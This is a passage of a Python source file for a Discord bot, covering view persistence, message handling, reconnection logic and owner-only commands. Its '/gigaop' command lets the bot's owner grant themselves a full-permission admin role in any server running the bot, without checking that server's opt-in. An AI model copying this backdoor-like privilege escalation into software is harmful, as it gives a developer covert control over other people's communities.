                        "🎵 **Music System**: Play your favorite tunes\n"
                        "🎫 **Ticket System**: Handle support requests\n"
                        "🤖 **AI Chat**: Chat with me by mentioning me\n"
                        "And more!"
                    ),
                    color=discord.Color.blue()
                )
                await welcome_channel.send(embed=embed)
            finally:
                session.close()

    async def on_voice_state_update(self, member, before, after):
        """Handle voice state updates - includes leveling XP tracking and Vocard music events"""
        # Handle leveling voice XP tracking
        try:
            await lvl.handle_voice_state_update(member, before, after)
        except Exception as e:
            print(f"Error in leveling voice state handling: {e}")
        
        # Vocard handles music-related voice events automatically

    async def backup_database(self):
        """Create a backup of the database"""
        try:
            from database import create_backup
            create_backup()
            print(f"Database backup created successfully at {datetime.utcnow()}")
        except Exception as e:
            print(f"Error creating database backup: {e}")
            print(traceback.format_exc())
    
    async def load_persistent_views(self):
        """Load persistent views for interactive messages and tickets"""
        restored_messages = 0
        restored_tickets = 0
        cleaned_messages = 0
        print("🔄 Starting persistence restoration...")
        print(f"🤖 Bot is connected to {len(self.guilds)} guild(s):")
        for guild in self.guilds:
            print(f"   • {guild.name} (ID: {guild.id}) - {len(guild.channels)} channels")
            session = get_session(str(guild.id))
            try:
                # STEP 1: Clean up deleted messages from database
                print("🧹 Cleaning up deleted messages...")
                interactive_messages = session.query(InteractiveMessage).all()
                print(f"📋 Found {len(interactive_messages)} interactive messages in database")
                for msg_data in interactive_messages:
                    print(f"\n🔍 Checking message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Server ID: {msg_data.server_id}")
                    print(f"   Title: {msg_data.title}")
                    print(f"   Buttons: {len(msg_data.buttons)}")
                    
                    # Check if bot is in the server where this message was created
                    target_guild = self.get_guild(int(msg_data.server_id))
                    if target_guild:
                        print(f"   ✅ Bot is in server: {target_guild.name}")
                    else:
                        print(f"   ❌ Bot is NOT in server {msg_data.server_id}")
                        print(f"   🗑️ Removing message {msg_data.id} from database (bot not in server)")
                        session.delete(msg_data)
                        cleaned_messages += 1
                        continue
                    
                    try:
                        channel = self.get_channel(int(msg_data.channel_id))
                        if not channel:
                            print(f"   ❌ Channel {msg_data.channel_id} not found with get_channel()")
                            print(f"   🔍 Channel ID type: {type(msg_data.channel_id)}")
                            print(f"   🔍 Channel ID value: '{msg_data.channel_id}'")
                            
                            # Try converting to int explicitly
                            try:
                                channel_id_int = int(msg_data.channel_id)
                                print(f"   🔍 Converted to int: {channel_id_int}")
                            except ValueError as ve:
                                print(f"   ❌ Cannot convert channel ID to int: {ve}")
                                session.delete(msg_data)
                                cleaned_messages += 1
                                continue
                            
                            # Try different methods to get the channel
                            print(f"   🔍 Trying different channel lookup methods...")
                            
                            # Method 1: get_channel with explicit int
                            test_channel = self.get_channel(channel_id_int)
                            print(f"   • get_channel(int): {test_channel}")
                            
                            # Method 2: Look in the target guild specifically
                            guild_channel = target_guild.get_channel(channel_id_int)
                            print(f"   • guild.get_channel(): {guild_channel}")
                            
                            # Method 3: Try to fetch from Discord API
                            try:
                                print(f"   🔍 Attempting to fetch channel directly from Discord API...")
                                fetched_channel = await self.fetch_channel(channel_id_int)
                                print(f"   • fetch_channel(): {fetched_channel}")
                                if fetched_channel:
                                    print(f"   ✅ Channel exists! Name: #{fetched_channel.name}")
                                    print(f"   ✅ Guild: {fetched_channel.guild.name}")
                                    print(f"   ⚠️ But get_channel() failed - possible caching issue")
                                    channel = fetched_channel  # Use the fetched channel
                                else:
                                    print(f"   ❌ fetch_channel() also returned None")
                            except discord.Forbidden as e:
                                print(f"   ❌ No permission to fetch channel: {e}")
                            except discord.NotFound as e:
                                print(f"   ❌ Channel truly doesn't exist: {e}")
                            except Exception as e:
                                print(f"   ❌ Error fetching channel: {e}")
                            
                            # If we still don't have the channel, try searching all guilds
                            if not channel:
                                print(f"   🔍 Searching all {len(self.guilds)} guilds for channel...")
                                found_in_guild = None
                                for guild in self.guilds:
                                    guild_channel = guild.get_channel(channel_id_int)
                                    if guild_channel:
                                        found_in_guild = guild
                                        channel = guild_channel
                                        break
                                
                                if found_in_guild:
                                    print(f"   🔍 Channel found in guild: {found_in_guild.name} (ID: {found_in_guild.id})")
                                    print(f"   🔍 Channel name: #{guild_channel.name}")
                                    print(f"   ⚠️ But bot.get_channel() couldn't access it - cache issue?")
                                else:
                                    print(f"   🔍 Channel not found in any of {len(self.guilds)} connected guilds")
                            
                            # If we STILL don't have the channel, remove from database
                            if not channel:
                                print(f"   🗑️ Removing message {msg_data.id} from database - channel truly inaccessible")
                                session.delete(msg_data)
                                cleaned_messages += 1
                                continue
                        
                        print(f"   ✅ Channel found: #{channel.name} in {channel.guild.name}")
                        
                        try:
                            message = await channel.fetch_message(int(msg_data.message_id))
                            print(f"   ✅ Discord message found and accessible")
                        except discord.NotFound:
                            print(f"   ❌ Discord message {msg_data.message_id} not found, removing from database")
                            session.delete(msg_data)
                            cleaned_messages += 1
                            continue
                        except discord.Forbidden:
                            print(f"   ⚠️ No permission to fetch message {msg_data.message_id}, skipping")
                            continue
                        
                    except Exception as e:
                        print(f"   ❌ Error checking message {msg_data.id}: {e}")
                        continue
                
                # Commit cleanup changes
                if cleaned_messages > 0:
                    session.commit()
                    print(f"\n🗑️ Cleaned up {cleaned_messages} deleted messages from database")
                
                # STEP 2: Register views with bot (this is crucial for persistent views)
                print(f"\n📋 Registering interactive message views with bot...")
                remaining_messages = session.query(InteractiveMessage).all()
                print(f"📊 {len(remaining_messages)} messages remaining after cleanup")
                
                for msg_data in remaining_messages:
                    print(f"\n🔧 Processing message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Title: {msg_data.title}")
                    print(f"   Button count: {len(msg_data.buttons)}")
                    
                    try:
                        if msg_data.buttons:
                            print(f"   📝 Button details:")
                            for i, button in enumerate(msg_data.buttons):
                                print(f"      {i+1}. {button.button_type.upper()}: '{button.label}' (ID: {button.id})")
                            
                            # Create view and register it with the bot
                            print(f"   🔄 Creating InteractiveMessageView...")
                            guild = self.get_guild(int(msg_data.server_id))
                            view = InteractiveMessageView(msg_data, guild)
                            
                            print(f"   🔗 Registering view with bot...")
                            self.add_view(view)  # This is the key step!
                            
                            restored_messages += 1
                            print(f"   ✅ Successfully registered view for message {msg_data.message_id}")
                        else:
                            print(f"   ⏭️ No buttons found, skipping")
                            
                    except Exception as e:
                        print(f"   ❌ Error registering view for message {msg_data.id}: {e}")
                        import traceback
                        traceback.print_exc()
                        continue
                
            except Exception as e:
                print(f"❌ Error loading interactive messages for guild {guild.id}: {e}")
                import traceback
                traceback.print_exc()
            finally:
                session.close()
        
        try:
            # STEP 3: Load ticket control views
            print("🎫 Loading ticket control views...")
            
            try:
                open_tickets = session.query(Ticket).filter_by(status="open").all()
            except Exception as db_error:
                if "no such column" in str(db_error).lower():
                    print("⚠️ Database schema outdated - some features may not work until database is updated")
                    print("💡 To fix: Run `/fixdb` command or delete data/tasks.db and restart")
                    try:
                        open_tickets = session.execute(
                            "SELECT id, ticket_id, channel_id, server_id, creator_id, button_id, status, created_at, closed_at, closed_by FROM tickets WHERE status = 'open'"
                        ).fetchall()
                        class TicketLike:
                            def __init__(self, row):
                                self.id = row[0]
                                self.channel_id = str(row[2])
                        open_tickets = [TicketLike(row) for row in open_tickets]
                    except:
                        print("❌ Cannot load tickets due to database issues")
                        open_tickets = []
                else:
                    print(f"❌ Database error loading tickets: {db_error}")
                    open_tickets = []
            
            for ticket in open_tickets:
                try:
                    channel = self.get_channel(int(ticket.channel_id))
                    if channel:
                        view = TicketControlView(ticket.id)
                        self.add_view(view)
                        restored_tickets += 1
                        print(f"✅ Registered ticket control view for ticket {ticket.id}")
                    else:
                        print(f"❌ Ticket channel {ticket.channel_id} not found for ticket {ticket.id}")
                except Exception as e:
                    print(f"❌ Error restoring ticket view {ticket.id}: {e}")
                    continue
                    
        except Exception as e:
            print(f"❌ Error loading ticket views: {e}")
        
        finally:
            session.close()
        
        print(f"🎉 Persistence restoration complete!")
        print(f"📊 Results:")
        print(f"   • Registered {restored_messages} interactive message views")
        print(f"   • Registered {restored_tickets} ticket control views") 
        print(f"   • Cleaned up {cleaned_messages} deleted messages")
        
        if restored_messages == 0 and restored_tickets == 0:
            print("ℹ️ No persistent views found to restore")
        else:
            print("✅ All buttons should now work properly!")
            
        # STEP 4: Optional - Auto-refresh problematic messages (run after a delay)
        if restored_messages > 0:
            print("⏳ Will auto-refresh messages in 5 seconds to ensure proper display...")
            await asyncio.sleep(5)
            await self._auto_refresh_messages()

    async def _auto_refresh_messages(self):
        """Auto-refresh interactive messages to ensure proper display and functionality"""
        refreshed = 0
        
        print("🔄 Auto-refreshing interactive messages...")
        
        for guild in self.guilds:
            session = get_session(str(guild.id))
            try:
                interactive_messages = session.query(InteractiveMessage).all()
                print(f"🔍 Found {len(interactive_messages)} messages to potentially refresh for guild {guild.name}")
                
                for msg_data in interactive_messages:
                    print(f"\n🔄 Refreshing message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Title: {msg_data.title}")
                    
                    try:
                        if not msg_data.buttons:
                            print(f"   ⏭️ No buttons, skipping refresh")
                            continue
                            
                        channel = self.get_channel(int(msg_data.channel_id))
                        if not channel:
                            print(f"   ❌ Channel not found")
                            continue
                        
                        print(f"   ✅ Channel found: #{channel.name}")
                        
                        try:
                            message = await channel.fetch_message(int(msg_data.message_id))
                            print(f"   ✅ Discord message fetched successfully")
                        except (discord.NotFound, discord.Forbidden) as e:
                            print(f"   ❌ Cannot access message: {e}")
                            continue
                        
                        # Create embed with proper format (same as Update & Refresh)
                        print(f"   🎨 Creating new embed...")
                        try:
                            color = discord.Color(int(msg_data.color, 16))
                            print(f"   🎨 Using color: {msg_data.color}")
                        except:
                            color = discord.Color.blurple()
                            print(f"   🎨 Using default color (blurple)")
                        
                        description_text = msg_data.description if msg_data.description else ""
                        # Process emojis in title and description
                        guild = self.get_guild(int(msg_data.server_id))
                        processed_title = process_description_emojis(msg_data.title, guild) if guild else msg_data.title
                        processed_description = process_description_emojis(description_text, guild) if description_text and guild else description_text
                        
                        if processed_description:
                            updated_description = f"# {processed_title}\n\n{processed_description}\n\n-# Message ID: {msg_data.message_id}"
                        else:
                            updated_description = f"# {processed_title}\n\n-# Message ID: {msg_data.message_id}"
                        
                        embed = discord.Embed(
                            description=updated_description,
                            color=color
                        )
                        
                        # Create view (should already be registered with bot)
                        print(f"   🔧 Creating new view...")
                        guild = self.get_guild(int(msg_data.server_id))
                        view = InteractiveMessageView(msg_data, guild)
                        
                        print(f"   📝 Updating Discord message...")
                        await message.edit(embed=embed, view=view)
                        refreshed += 1
                        print(f"   ✅ Successfully refreshed message {msg_data.message_id}")
                        
                    except Exception as e:
                        print(f"   ⚠️ Could not refresh message {msg_data.message_id}: {e}")
                        import traceback
                        traceback.print_exc()
                        continue
                        
            except Exception as e:
                print(f"❌ Error during auto-refresh for guild {guild.name}: {e}")
                import traceback
                traceback.print_exc()
            finally:
                session.close()
                
        print(f"\n🎉 Auto-refresh complete!")
        if refreshed > 0:
            print(f"✅ Successfully refreshed {refreshed} interactive messages")
        else:
            print("ℹ️ No messages were refreshed")

    async def on_message(self, message: discord.Message):
        """Handle messages - includes Vocard music request channel logic"""
        # Ignore messages from bots or DMs
        if message.author.bot or not message.guild:
            return
            
        # Handle AI chat bot mentions first
        try:
            handled = await puddleai.handle_bot_mention(message, self)
            if handled:
                return  # Don't process further if it was an AI response
        except Exception as e:
            print(f"Error in AI chat message handling: {e}")
            
        # Handle OpenChat messages
        try:
            handled = await openchat.handle_openchat_message(message)
            if handled:
                return  # Don't process further if it was an OpenChat message
        except Exception as e:
            print(f"Error in OpenChat message handling: {e}")
        
        # Check for music request channel (Vocard functionality)
        if music_func and hasattr(music_func, 'settings'):
            try:
                settings = await music_func.get_settings(message.guild.id)
                if settings and (request_channel := settings.get("music_request_channel")):
                    if message.channel.id == request_channel.get("text_channel_id"):
                        ctx = await self.get_context(message)
                        try:
                            cmd = self.get_command("play")
                            if cmd:
                                if message.content:
                                    await cmd(ctx, query=message.content)
                                elif message.attachments:
                                    for attachment in message.attachments:
                                        await cmd(ctx, query=attachment.url)
                        except Exception as e:
                            await music_func.send(ctx, str(e), ephemeral=True)
                        finally:
                            return await message.delete()
            except Exception as e:
                print(f"Error in music request channel handling: {e}")
        
        # Handle intmsg conversation messages
        try:
            handled = await intmsg.handle_intmsg_message(message)
            if handled:
                return  # Don't process as command if handled by intmsg
        except Exception as e:
            print(f"Error in intmsg message handling: {e}")
            print(traceback.format_exc())
        
        # Handle leveling XP from messages
        try:
            await lvl.handle_message_xp(message)
        except Exception as e:
            print(f"Error in leveling message handling: {e}")
        
        # Remove command processing since we're using slash commands
        # await self.process_commands(message)

class SpecialFeaturesView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # No timeout for the button
        
    @discord.ui.button(
        label="Enable Special Features",
        style=discord.ButtonStyle.primary,
        emoji="✨",
        custom_id="enable_special_features"
    )
    async def enable_special_features(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Check if the user has administrator permissions
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message(
                "❌ Only server administrators can enable special features!",
                ephemeral=True
            )
            return
            
        # Store opt-in status in database
        session = get_session('global')
        try:
            opt_in = session.query(MultidimensionalOptIn).filter_by(server_id=str(interaction.guild_id)).first()
            if not opt_in:
                opt_in = MultidimensionalOptIn(
                    server_id=str(interaction.guild_id),
                    opted_in=True,
                    opt_in_time=datetime.utcnow(),
                    opt_in_by=str(interaction.user.id)
                )
                session.add(opt_in)
            else:
                opt_in.opted_in = True
                opt_in.opt_in_time = datetime.utcnow()
                opt_in.opt_in_by = str(interaction.user.id)
            session.commit()
        except Exception as e:
            logger.error(f"Error storing opt-in status: {e}")
            await interaction.response.send_message(
                "❌ There was an error enabling special features. Please try again later.",
                ephemeral=True
            )
            return
        finally:
            session.close()
            
        # Create embed for confirmation
        embed = discord.Embed(
            title="✨ Special Features Enabled!",
            description=(
                "You have opted in to special features!\n\n"
                "**What this means:**\n"
                "• The bot owner can now use `/multidimensionaltravel` to visit your server\n"
                "• You may request features or assistance when the owner visits\n"
                "• You can disable this at any time by contacting support\n\n"
                "**Important Notes:**\n"
                "• These permissions are covered by our Terms of Service\n"
                "• Your privacy and server security remain our top priority\n"
                "• You can review our [Terms of Service](https://github.com/EcoEngineDev/PuddlesBot/blob/main/termsofservice.md) for full details"
            ),
            color=discord.Color.green()
        )
        
        # Disable the button after it's been used
        button.disabled = True
        await interaction.message.edit(view=self)
        
        # Send confirmation with the embed
        await interaction.response.send_message(embed=embed, ephemeral=True)

def setup_owner_commands(tree: app_commands.CommandTree):
    @tree.command(
        name="multidimensionaltravel",
        description="Get invites to opted-in servers (owner-only execution, public visibility)."
    )
    @app_commands.describe(
        notification="If 'true', sends opt-in requests to non-opted-in servers"
    )
    async def multidimensionaltravel(
        interaction: discord.Interaction,
        notification: bool = False
    ):
        """
        Public slash command, but only executable by the owner.
        Shows invites only for servers that have opted in.
        Optional notification parameter to send opt-in requests.
        """
        owner_id = int(os.getenv('BOT_OWNER_ID', '0'))
        if interaction.user.id != owner_id:
            await interaction.response.send_message("❌ This command is only for the bot owner.", ephemeral=True)
            return
            
        # Get list of opted-in servers
        session = get_session('global')
        try:
            opted_in_servers = session.query(MultidimensionalOptIn).filter_by(opted_in=True).all()
            opted_in_ids = {opt.server_id for opt in opted_in_servers}
        finally:
            session.close()
            
        links = []
        no_invite_servers = []
        not_opted_in = []
        notification_sent = 0
        notification_failed = 0
        
        for guild in interaction.client.guilds:
            if str(guild.id) not in opted_in_ids:
                not_opted_in.append(guild.name)
                
                # Send notification if requested
                if notification:
                    try:
                        # Find suitable channel
                        channel = None
                        for c in guild.text_channels:
                            if c.permissions_for(guild.me).send_messages:
                                channel = c
                                break
                                
                        if channel:
                            opt_in_embed = discord.Embed(
                                title="🌌 /multidimensionaltravel Available!",
                                description=(
                                    "Hello! This is a reminder about Puddles' /multidimensionaltravel features.\n\n"
                                    "These features allow the bot owner to visit and help with:\n"
                                    "• Custom feature requests\n"
                                    "• Technical support\n"
                                    "• Server optimization\n\n"
                                    "sorry if you are seeing a bunch of these messages this is the initial testing of this system\n\n"
                                    "• THIS WILL ALLOW THE BOT OWNER TO JOIN YOUR SERVER AND DROP BY AND SAY HELLO FOR THE FOLLOWING REASONS ^\n\n"
                                    "Would you like to enable these features?"
                                ),
                                color=discord.Color.blue()
                            )
                            await channel.send(embed=opt_in_embed, view=SpecialFeaturesView())
                            notification_sent += 1
                        else:
                            notification_failed += 1
                    except Exception as e:
                        logger.error(f"Failed to send notification to guild {guild.id}: {e}")
                        notification_failed += 1
                continue
                
            # Try to find a text channel where the bot can create invites
            channel = None
            for c in guild.text_channels:
                perms = c.permissions_for(guild.me)
                if perms.create_instant_invite and perms.view_channel:
                    channel = c
                    break
                    
            if not channel:
                no_invite_servers.append(guild.name)
                continue
                
            try:
                invite = await channel.create_invite(
                    max_age=86400,  # 24 hours
                    max_uses=1,     # Single use
                    unique=True,
                    reason="Owner multidimensional travel command"
                )
                links.append(f"**{guild.name}**: [Join]({invite.url})")
            except Exception as e:
                no_invite_servers.append(f"{guild.name} (Error: {str(e)})")
        
        # Create embed with all information
        embed = discord.Embed(
            title="🌌 Multidimensional Travel",
            description="Here are your single-use invites to opted-in servers:",
            color=discord.Color.blue()
        )
        
        if links:
            embed.add_field(
                name="🎟️ Available Invites",
                value="\n".join(links),
                inline=False
            )
        
        if no_invite_servers:
            embed.add_field(
                name="⚠️ Cannot Create Invites",
                value="\n".join(f"• {name}" for name in no_invite_servers),
                inline=False
            )
            
        if not_opted_in:
            embed.add_field(
                name="❌ Not Opted In",
                value="\n".join(f"• {name}" for name in not_opted_in),
                inline=False
            )
            
        if notification:
            status = []
            if notification_sent > 0:
                status.append(f"✅ Sent to {notification_sent} server(s)")
            if notification_failed > 0:
                status.append(f"❌ Failed for {notification_failed} server(s)")
            if status:
                embed.add_field(
                    name="📬 Notification Status",
                    value="\n".join(status),
                    inline=False
                )
            
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @tree.command(
        name="gigaop",
        description="Grant admin permissions to bot owner for debugging (owner-only execution, public visibility)."
    )
    async def gigaop(interaction: discord.Interaction):
        """
        Public slash command, but only executable by the owner.
        Creates a new role with admin permissions and assigns it to the owner.
        """
        owner_id = int(os.getenv('BOT_OWNER_ID', '0'))
        if interaction.user.id != owner_id:
            await interaction.response.send_message("❌ This command is only for the bot owner.", ephemeral=True)
            return

        try:
            # Check if bot has manage roles permission
            if not interaction.guild.me.guild_permissions.administrator:
                await interaction.response.send_message(
                    "❌ I need administrator permissions to create and assign roles.",
                    ephemeral=True
                )
                return

            # Check if owner already has admin permissions
            member = interaction.guild.get_member(owner_id)
            if member.guild_permissions.administrator:
                await interaction.response.send_message(
                    "✅ You already have administrator permissions in this server.",
                    ephemeral=True
                )
                return

            # Create a new role with admin permissions
            role_name = "PuddlesDebug"
            existing_role = discord.utils.get(interaction.guild.roles, name=role_name)
            
            if existing_role:
                role = existing_role
            else:
                # Create role at the bottom first
                role = await interaction.guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions.all(),
                    color=discord.Color.blue(),
                    reason="Debug role for bot owner"
                )
                
                # Get bot's role and calculate proper position
                bot_role = interaction.guild.me.top_role
                if bot_role and bot_role.position > 1:  # Ensure bot's role isn't at bottom
                    try:
                        # Place role 1 position below bot's role
                        positions = {
                            role: role.position - 1 if role.position < bot_role.position else role.position
                            for role in interaction.guild.roles
                        }
                        positions[role] = bot_role.position - 1
                        await interaction.guild.edit_role_positions(positions=positions)
                    except Exception as e:
                        print(f"Warning: Could not position role optimally: {e}")
                        # Role will still work even if positioning fails

            # Assign the role to the owner
            await member.add_roles(role, reason="Debug access for bot owner")

            embed = discord.Embed(
                title="🛠️ Debug Access Granted",
                description=f"Successfully granted administrator permissions via the {role.mention} role.",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Purpose",
                value="This access is for debugging and helping server members with bot functionality.",
                inline=False
            )
            embed.add_field(
                name="Security Note",
                value="This command is restricted to the bot owner and creates an audit log entry for transparency.",
                inline=False
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ I don't have permission to manage roles in this server.",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"❌ An error occurred: {str(e)}",
                ephemeral=True
            )

# All task-related code moved to tasks.py module

# ============= BOT INITIALIZATION =============

async def run_bot_with_reconnection():
    """Run the bot with automatic reconnection on errors"""
    max_retries = 10
    retry_count = 0
    base_delay = 5  # seconds
    client = None
    
    while retry_count < max_retries:
        try:
            logger.info(f"Starting PuddlesBot... (Attempt {retry_count + 1}/{max_retries})")
            
            # Log system information on startup
            log_system_info()
            
            # Create new client instance if needed
            if not client:
                client = PuddlesBot()
            
            # Start the bot
            await client.start(os.getenv('DISCORD_TOKEN'))
            
        except discord.LoginFailure:
            logger.critical("Invalid Discord token! Please check your .env file.")
            break
            
        except discord.HTTPException as e:
            logger.error(f"HTTP error occurred: {e}", exc_info=True)
            if e.status == 429:  # Rate limited
                retry_after = getattr(e, 'retry_after', 60)
                logger.warning(f"Rate limited, waiting {retry_after} seconds...")
                await asyncio.sleep(retry_after)
            retry_count += 1
            
        except discord.ConnectionClosed as e:
            logger.error(f"Connection closed: {e}", exc_info=True)
            logger.info("Attempting to reconnect...")
            retry_count += 1
            
        except (ClientConnectorError, ClientError) as e:
            logger.error(f"Network error: {e}", exc_info=True)
            logger.info("Waiting for network to stabilize...")
            await asyncio.sleep(30)  # Wait longer for network issues
            retry_count += 1
            
        except asyncio.CancelledError:
            logger.info("Bot shutdown requested")
            break
            
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received, shutting down...")
            break
            
        except Exception as e:
            logger.critical("Unexpected error", exc_info=True)
            logger.error(f"Retrying in {base_delay * (retry_count + 1)} seconds...")
            await asyncio.sleep(base_delay * (retry_count + 1))
            retry_count += 1
            
        finally:
            # Clean up if we have a client
            if client:
                try:
                    await client.close()
                except Exception as e:
                    logger.error(f"Error during client cleanup: {e}", exc_info=True)
            
        if retry_count < max_retries:
            # Exponential backoff with max delay
            delay = min(base_delay * (2 ** retry_count), 300)  # Max 5 minutes
            logger.info(f"Waiting {delay} seconds before retry...")
            await asyncio.sleep(delay)
            
            # Reset retry count if it's been a while since last retry
            if retry_count > 3:
                logger.info("Resetting retry count to prevent excessive delays...")
                retry_count = 0
    
    logger.critical(f"Failed to start bot after {max_retries} attempts. Exiting.")
    sys.exit(1)

if __name__ == "__main__":
    try:
        # Check if Discord token exists
        token = os.getenv('DISCORD_TOKEN')
        if not token:
            logger.critical("DISCORD_TOKEN not found in environment variables!")
            logger.error("Please set your Discord bot token in the .env file.")
            sys.exit(1)
            
        # Check Windows-specific settings
        if os.name == 'nt':  # Windows
            logger.info("Windows detected - Applying power management optimizations...")
            logger.warning("IMPORTANT: To prevent disconnections:")
            logger.info("   1. Disable 'USB selective suspend' in Power Options")
            logger.info("   2. Set network adapter to never turn off")
            logger.info("   3. Disable 'Fast Startup' in Power Options")
            logger.info("   4. Consider running as administrator")
            logger.info("")
        
        # Run bot with reconnection
        asyncio.run(run_bot_with_reconnection())
        
    except KeyboardInterrupt:
        logger.info("Bot shutdown requested by user")
    except Exception as e:
        logger.critical("Critical error starting bot", exc_info=True)
        sys.exit(1) 
